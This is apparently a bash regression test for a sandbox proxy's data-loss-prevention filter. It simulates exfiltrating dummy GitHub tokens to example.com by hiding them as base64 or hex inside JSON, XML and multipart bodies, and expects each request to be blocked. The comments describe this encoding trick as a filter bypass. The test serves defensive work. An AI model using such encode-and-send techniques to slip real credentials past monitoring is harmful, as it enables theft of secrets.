#!/usr/bin/env bash
# ============================================================================
# t_dlp_base64.sh — DLP catches tokens hidden by base64 / hex encoding
#
# Regression for F3 (DLP plan): the original `decode_layers` treated the
# entire request body as one base64/hex/percent blob and bailed on the
# first decoder that succeeded. A token embedded inside a larger JSON
# envelope —
#
#   {"event":"upload","payload":"Z2hwX0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU…"}
#
# slipped past every detector because the outer `{ … }` isn't valid base64.
# The fragment-aware decoder (R7) now locates plausible encoded substrings
# (≥ 16 chars of the b64 / hex charset) and decodes each in isolation.
#
# This file drives the proxy end-to-end:
#   1. A worker POSTs a JSON body to `http://example.com/` whose `payload`
#      field is base64(GithubPat).
#   2. DLP must return 451 + `x-canister-error: dlp-blocked`.
#   3. Repeat with a hex-encoded token inside an XML envelope.
#   4. Negative test: a short (<16 char) base64 string in a body does NOT
#      trip (false-positive guard for the fragment scanner).
# ============================================================================

source "$(dirname "$0")/lib.sh"
require_user_namespaces
require_pasta
require_python3
header "DLP catches encoded tokens via fragment-aware decoding"

CONFIG=$(tmpconfig <<'EOF'
[filesystem]
allow = ["/usr/lib", "/usr/bin", "/usr/local", "/lib", "/lib64", "/tmp"]

[network]
egress = "proxy-only"
allow_domains = ["example.com"]

[process]
env_passthrough = ["PATH", "HOME", "LANG", "TERM"]

[syscalls]
EOF
)
_TMPFILES+=("$CONFIG")

PYTHON_POST='
import os, sys, urllib.request, urllib.error
url, body, content_type = sys.argv[1], sys.argv[2], sys.argv[3]
proxy = os.environ.get("HTTP_PROXY")
assert proxy, "HTTP_PROXY not set"
opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
req = urllib.request.Request(url, data=body.encode(), headers={"Content-Type": content_type}, method="POST")
try:
    resp = opener.open(req, timeout=5)
    print(f"UNEXPECTED status={resp.status}")
except urllib.error.HTTPError as e:
    err = e.headers.get("x-canister-error", "?")
    det = e.headers.get("x-canister-dlp-detector", "?")
    print(f"BLOCKED status={e.code} err={err} detector={det}")
except Exception as e:
    print(f"ERR error={e}")
'

# ---- Test 1: base64-encoded GitHub PAT inside JSON envelope ----
begin_test "DLP blocks base64(GithubPat) embedded in JSON body"
TOKEN="ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
B64=$(printf %s "$TOKEN" | base64 -w0)
JSON_BODY="{\"event\":\"upload\",\"payload\":\"${B64}\"}"
run_can run --recipe "$CONFIG" -- \
    python3 -c "$PYTHON_POST" "http://example.com/" "$JSON_BODY" "application/json"
case "$RUN_STDOUT" in
    *"BLOCKED status=451"*"err=dlp-blocked"*)
        pass
        ;;
    *)
        fail "expected 451 dlp-blocked for base64-embedded token; got: $RUN_STDOUT"
        ;;
esac

# ---- Test 2: hex-encoded GitHub PAT inside XML envelope ----
begin_test "DLP blocks hex(GithubPat) embedded in XML body"
TOKEN="ghp_BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
HEX=$(printf %s "$TOKEN" | od -An -tx1 | tr -d ' \n')
XML_BODY="<auth><token>${HEX}</token></auth>"
run_can run --recipe "$CONFIG" -- \
    python3 -c "$PYTHON_POST" "http://example.com/" "$XML_BODY" "application/xml"
case "$RUN_STDOUT" in
    *"BLOCKED status=451"*"err=dlp-blocked"*)
        pass
        ;;
    *)
        fail "expected 451 dlp-blocked for hex-embedded token; got: $RUN_STDOUT"
        ;;
esac

# ---- Test 3: short base64 substring does NOT trip the fragment scanner ----
# A 12-char base64 string (`YWJjZGVmZ2hpams=`) is below MIN_FRAGMENT_LEN
# in decode.rs and must not produce a fragment-decoded layer.
begin_test "DLP does not false-positive on short base64 substrings"
SHORT_BODY='{"x":"YWJjZGVmZ2hpams="}'
run_can run --recipe "$CONFIG" -- \
    python3 -c "$PYTHON_POST" "http://example.com/" "$SHORT_BODY" "application/json"
# We expect this to NOT be a 451 — it should be allowed past the DLP gate.
# The upstream may still 502 because example.com may not respond to a JSON
# POST, or it may succeed; what must NOT happen is `err=dlp-blocked`.
case "$RUN_STDOUT" in
    *"err=dlp-blocked"*)
        fail "false-positive: short base64 substring blocked: $RUN_STDOUT"
        ;;
    *)
        pass
        ;;
esac

# ---- Test 4: base64-encoded token inside a multipart MIME envelope ----
# multipart/form-data is a common upload format; the F3 attacker can use a
# form field's value as the carrier.
begin_test "DLP blocks base64(GithubPat) inside multipart body"
TOKEN="ghp_CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"
B64=$(printf %s "$TOKEN" | base64 -w0)
BOUNDARY="boundary123"
MULTIPART=$(printf -- '--%s\r\nContent-Disposition: form-data; name="f"\r\n\r\n%s\r\n--%s--\r\n' \
    "$BOUNDARY" "$B64" "$BOUNDARY")
run_can run --recipe "$CONFIG" -- \
    python3 -c "$PYTHON_POST" "http://example.com/" "$MULTIPART" \
    "multipart/form-data; boundary=${BOUNDARY}"
case "$RUN_STDOUT" in
    *"BLOCKED status=451"*"err=dlp-blocked"*)
        pass
        ;;
    *)
        fail "expected 451 dlp-blocked for multipart-embedded token; got: $RUN_STDOUT"
        ;;
esac

summary
